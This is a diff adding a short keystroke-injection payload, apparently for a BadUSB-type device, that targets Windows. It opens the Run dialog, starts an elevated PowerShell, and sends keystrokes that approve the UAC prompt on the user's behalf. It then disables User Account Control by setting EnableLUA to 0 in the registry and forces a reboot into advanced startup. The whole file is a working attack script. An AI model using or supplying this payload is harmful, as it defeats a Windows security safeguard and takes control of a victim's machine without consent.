@@ -1,0 +1,14 @@
+WTIME 500
+WUI r
+WTIME 1500
+SCRIPT powershell -NoProfile -Command "Start-Process cmd.exe -Verb runAs -ArgumentList '/c start \"\" /max \"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe\" -NoLogo -NoExit'"
+ENTER
+WTIME 4000
+LEFT
+ENTER
+WTIME 1500
+SCRIPT Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 
+ENTER
+WTIME 5000
+SCRIPT shutdown /r /o /t 0
+ENTER
